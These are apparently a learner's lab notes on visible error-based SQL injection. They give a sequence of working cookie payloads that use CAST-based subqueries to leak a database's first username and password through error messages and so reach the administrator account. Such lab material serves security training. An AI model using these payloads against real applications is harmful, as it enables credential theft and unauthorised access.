Lab #11 - Visible error-based SQL injection

Vulnerable parameter - tracking cookie

End Goals:
- Output or Finding out the first username and password 
- Login as the administrator user

Analysis:

1) Prove that parameter is vulnerable

TrackingId=ogAZZfxtOKUELbuJ' -> error
TrackingId=ogAZZfxtOKUELbuJ'-- -> No error

2)  Getting a different error saying that an AND condition must be a boolean expression. 
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)-- -> Error
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)-- -> No Error, is a valid query


3) To receive a new error message, which appears to be generated by the database.
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)-- 
-> still getting an error because it unexpectedly returned more than one row. 



3) error message now leaks the first username from the users table:
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--



4) modify the query once again to leak their password: 

TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
